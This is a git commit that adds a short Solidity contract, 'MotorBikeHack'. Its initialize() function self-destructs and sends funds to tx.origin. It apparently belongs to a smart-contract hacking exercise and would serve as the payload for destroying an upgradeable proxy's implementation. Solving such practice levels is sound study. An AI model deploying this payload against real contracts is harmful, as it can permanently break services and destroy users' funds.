6b18bc9699593899149edc3d51fad582451f6ee9
Carlos Benjamin Alvarez Cruz <carlosalvarez098@gmail.com>
2022-02-23 13:24:45 -0600

    MotorbikeHack

---
+++ contracts/MotorbikeHack.sol
@@ -0,0 +1,11 @@
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+contract MotorBikeHack {
+
+    function initialize() external {
+        selfdestruct(payable(tx.origin));
+    }
+
+}
